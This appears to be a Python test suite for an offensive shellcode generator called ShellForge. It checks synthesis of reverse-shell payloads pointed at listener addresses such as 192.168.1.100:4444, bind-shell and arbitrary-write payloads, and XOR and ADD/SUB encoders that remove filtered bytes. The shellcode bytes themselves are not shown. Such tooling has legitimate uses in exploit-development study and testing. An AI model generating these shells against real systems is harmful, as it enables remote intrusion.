"""
test_phase2.py
──────────────
Phase 2 tests: reverse shell, bind shell, arbitrary write,
XOR decoder stub, ADD/SUB encoder.
Run from shellforge/ root after rebuilding the shared library.
"""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../"))

from python.engine.shellforge_bridge import (
    ShellForge, Constraints, Arch, OS, Goal, Encoding, SFStatus
)

PASS = "✅"; FAIL = "❌"
results = []

def test(name, fn):
    try:
        fn()
        print(f"  {PASS} {name}")
        results.append((name, True, None))
    except Exception as e:
        print(f"  {FAIL} {name}: {e}")
        results.append((name, False, str(e)))

def run():
    print("\n── ShellForge Phase 2 Test Suite ────────────────────────\n")
    try:
        sf = ShellForge()
        print(f"  {PASS} Library loaded: {sf.version()}\n")
    except FileNotFoundError as e:
        print(f"  {FAIL} Cannot load library: {e}"); return

    # ── T1: Reverse Shell ─────────────────────────────────────
    print("[ T1 ] Reverse Shell — x86-64 Linux")

    def t1_basic():
        c = Constraints(goal=Goal.REVERSE_SHELL)
        c.goal_args = ["192.168.1.100:4444"]
        r = sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 26, "Reverse shell should be larger than exec shell"
        print(f"       Size: {r.payload_len} bytes")
        print(f"       {r.hex_escaped()[:80]}...")
    test("Basic reverse shell synthesis", t1_basic)

    def t1_ip_patched():
        c = Constraints(goal=Goal.REVERSE_SHELL)
        c.goal_args = ["10.0.0.1:1337"]
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        # 10.0.0.1 = 0x0a 0x00 0x00 0x01 in network byte order
        assert 0x0a in r.payload, "IP byte 0x0a not found in payload"
    test("IP bytes patched correctly", t1_ip_patched)

    def t1_port_patched():
        c = Constraints(goal=Goal.REVERSE_SHELL)
        c.goal_args = ["127.0.0.1:4444"]  # 4444 = 0x115c
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        # port 4444 big-endian = 0x11 0x5c
        payload_hex = r.hex_escaped()
        assert "\\x11\\x5c" in payload_hex, f"Port bytes not found in: {payload_hex[:80]}"
    test("Port bytes patched correctly", t1_port_patched)

    def t1_bad_args():
        c = Constraints(goal=Goal.REVERSE_SHELL)
        # No args — should fail validation
        r = sf.synthesize(c)
        assert r.status == SFStatus.ERR_INVALID_ARG, f"Expected INVALID_ARG, got {r.status.name}"
    test("Missing args → ERR_INVALID_ARG", t1_bad_args)

    def t1_disasm():
        c = Constraints(goal=Goal.REVERSE_SHELL)
        c.goal_args = ["192.168.1.1:9001"]
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        assert "reverse shell" in r.disasm.lower(), "Expected 'reverse shell' in disasm"
    test("Disasm contains reverse shell label", t1_disasm)

    # ── T2: Bind Shell ────────────────────────────────────────
    print("\n[ T2 ] Bind Shell — x86-64 Linux")

    def t2_basic():
        c = Constraints(goal=Goal.BIND_SHELL)
        c.goal_args = ["4444"]
        r = sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 26
        print(f"       Size: {r.payload_len} bytes")
    test("Basic bind shell synthesis", t2_basic)

    def t2_port():
        c = Constraints(goal=Goal.BIND_SHELL)
        c.goal_args = ["1337"]  # 0x05 0x39
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        payload_hex = r.hex_escaped()
        assert "\\x05\\x39" in payload_hex, f"Port 1337 bytes not found"
    test("Port 1337 bytes patched correctly", t2_port)

    def t2_no_args():
        c = Constraints(goal=Goal.BIND_SHELL)
        r = sf.synthesize(c)
        assert r.status == SFStatus.ERR_INVALID_ARG
    test("Missing port → ERR_INVALID_ARG", t2_no_args)

    def t2_disasm():
        c = Constraints(goal=Goal.BIND_SHELL)
        c.goal_args = ["8080"]
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        assert "bind" in r.disasm.lower()
    test("Disasm contains bind label", t2_disasm)

    # ── T3: Arbitrary Write ───────────────────────────────────
    print("\n[ T3 ] Arbitrary Write")

    def t3_basic():
        c = Constraints(goal=Goal.ARBITRARY_WRITE)
        c.goal_args = ["0x7fffffffe000", "0x4141414141414141"]
        r = sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 0
        print(f"       Size: {r.payload_len} bytes")
        print(f"       {r.hex_escaped()}")
    test("Basic arbitrary write", t3_basic)

    def t3_ret_byte():
        c = Constraints(goal=Goal.ARBITRARY_WRITE)
        c.goal_args = ["0x1000", "0x0"]
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        assert r.payload[-1] == 0xc3, "Last byte should be ret (0xc3)"
    test("Payload ends with ret (0xc3)", t3_ret_byte)

    def t3_missing_args():
        c = Constraints(goal=Goal.ARBITRARY_WRITE)
        c.goal_args = ["0x1000"]  # missing value
        r = sf.synthesize(c)
        assert r.status == SFStatus.ERR_INVALID_ARG
    test("One arg → ERR_INVALID_ARG", t3_missing_args)

    # ── T4: XOR Encoder with decoder stub ────────────────────
    print("\n[ T4 ] XOR Encoder — full decoder stub")

    def t4_stub_included():
        # Force encoding by making a common byte bad
        c = Constraints(null_free=True)
        c.add_bad_char(0x48)  # REX prefix — forces encode
        r = sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.encoding_used == Encoding.XOR
        # Encoded payload is larger than raw (stub prepended)
        assert r.payload_len > 26, "XOR output should include decoder stub"
        print(f"       Encoded size: {r.payload_len} bytes (raw was 26)")
    test("XOR stub prepended — payload grows", t4_stub_included)

    def t4_stub_clean():
        # Verify the entire output (stub+payload) has no bad chars
        c = Constraints(null_free=True)
        c.add_bad_char(0x48)
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        assert 0x48 not in r.payload, "Bad char 0x48 found in XOR output"
        assert 0x00 not in r.payload, "Null byte in null-free XOR output"
    test("Full XOR output is constraint-clean", t4_stub_clean)

    def t4_disasm_has_stub():
        c = Constraints()
        c.add_bad_char(0x48)
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        assert "xor stub" in r.disasm.lower() or "decoder" in r.disasm.lower() or "key" in r.disasm.lower()
    test("Disasm documents XOR stub", t4_disasm_has_stub)

    # ── T5: ADD/SUB Encoder ───────────────────────────────────
    print("\n[ T5 ] ADD/SUB Encoder")

    def t5_explicit():
        c = Constraints(encoding=Encoding.ADD_SUB)
        c.add_bad_char(0x48)
        r = sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.encoding_used == Encoding.ADD_SUB
        print(f"       ADD/SUB encoded size: {r.payload_len} bytes")
    test("Explicit ADD/SUB encoding succeeds", t5_explicit)

    def t5_clean():
        c = Constraints(encoding=Encoding.ADD_SUB)
        c.add_bad_char(0x48)
        r = sf.synthesize(c)
        assert r.ok, r.error_msg
        assert 0x48 not in r.payload
    test("ADD/SUB output is constraint-clean", t5_clean)

    # ── T6: Encoder fallback chain ────────────────────────────
    print("\n[ T6 ] Encoder fallback (AUTO mode)")

    def t6_auto_picks_encoder():
        c = Constraints(encoding=Encoding.AUTO)
        c.add_bad_char(0x48)
        r = sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.encoding_used in (Encoding.XOR, Encoding.ADD_SUB)
        print(f"       AUTO chose: {r.encoding_used.name}")
    test("AUTO mode selects a working encoder", t6_auto_picks_encoder)

    # ── T7: Phase 1 regression ────────────────────────────────
    print("\n[ T7 ] Phase 1 regression check")

    def t7_exec_shell():
        c = Constraints()
        r = sf.synthesize(c)
        assert r.ok and r.payload_len == 26 and r.encoding_used == Encoding.NONE
    test("execve shell still 26 bytes raw", t7_exec_shell)

    # ── Summary ───────────────────────────────────────────────
    passed = sum(1 for _,ok,_ in results if ok)
    total  = len(results)
    print(f"\n── Results: {passed}/{total} passed ─────────────────────────\n")
    if passed < total:
        print("Failed:")
        for name,ok,msg in results:
            if not ok: print(f"  {FAIL} {name}: {msg}")
        sys.exit(1)
    else:
        print("All Phase 2 tests passed. Ready for Phase 3.\n")

if __name__ == "__main__":
    run()
